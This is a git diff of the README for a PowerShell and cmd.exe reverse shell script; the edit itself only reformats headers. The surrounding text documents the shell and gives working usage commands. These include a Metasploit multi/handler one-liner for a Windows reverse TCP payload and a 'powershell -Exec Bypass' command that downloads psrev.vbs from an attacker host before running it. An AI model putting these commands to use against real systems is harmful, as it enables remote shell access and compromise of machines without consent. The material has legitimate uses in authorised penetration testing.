@@ -7,14 +7,14 @@ https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOn
 
 **Tested on** PowerShell version 2 and up.
 
-**CMD Shell Intro:**<br />
+## CMD Shell Intro
 This is a pseudo cmd.exe reverse shell. I designed this shell to support some PowerShell convenience commands such as 'pwd','ls','ps','rm','cp','mv','cat'.
 
 Simply add more of them to the array if you wish to support more. Also, if you are determined to only support CMD commands when at the CMD prompt then reduce the list. Bear in mind that 'cd,'exit',and 'd:' are required, if you remove them you will be unable to make persistent changes to other drives or directories and you will not be able to use the exit command to exit the shell.
 
 The reality is that PowerShell is calling 'cmd.exe /c' for every cmd command that you enter, so in effect PowerShell is the parent, cmd.exe the child and the only environment change that persists between commands happens in PowerShell. For this reason I had to catch any directory or drive letter change and execute them in PowerShell, otherwise the change would not persist between one call to cmd.exe and the next.
 
-**PowerShell Shell Intro:**<br />
+## PowerShell Shell Intro
 This shell doubles as a PowerShell reverse shell. Type $ps on the cmd command line and the shell will switch to a PowerShell shell from the cmd.exe shell. Then type $ps=$false in the PowerShell shell and you will switch back to running commands through cmd.exe.
 
 The script is intended to be launched with the -NonI (non interactive) option of PowerShell. The result of not running it like this is that PowerShell will try to interactively prompt for missing parameters and your shell will be locked up. As a result of the -NonI option, if you fail to provide the required parameters to a PowerShell command you will not see any error messages, the command simply will not work. So if you are having issues with a command's syntax, be sure to test on your own Windows system from an interactive PowerShell prompt.
@@ -44,12 +44,12 @@ export EXP1=5379;<br />
 msfconsole -q -x "setg LHOST $HOSTIP;use exploit/multi/handler;set ExitOnSession false;set PAYLOAD windows/x64/shell_reverse_tcp;set EXITFUNC thread;set LPORT $EXP1;exploit -j;";
 
 **On Windows**<br />
-Download the psrev.vbs script...<br />
+**Download the psrev.vbs script...** <br />
 set HOSTIP=10.0.0.22<br />
 set EXP1=5379<br />
 powershell.exe -Exec Bypass "& {$storageDir = $pwd;$webclient = New-Object System.Net.WebClient;$url = 'http://%HOSTIP%/scripts/vbs/psrev.vbs';$file = 'psrev.vbs';$webclient.DownloadFile($url,$file)}"
 
-Run the psrev.vbs script...<br />
+**Run the psrev.vbs script...** <br />
 psrev.vbs<br />
 
 The psrev.vbs script requires that you have set the HOSTIP and EXP1 environment variables in the current CMD shell on Windows.
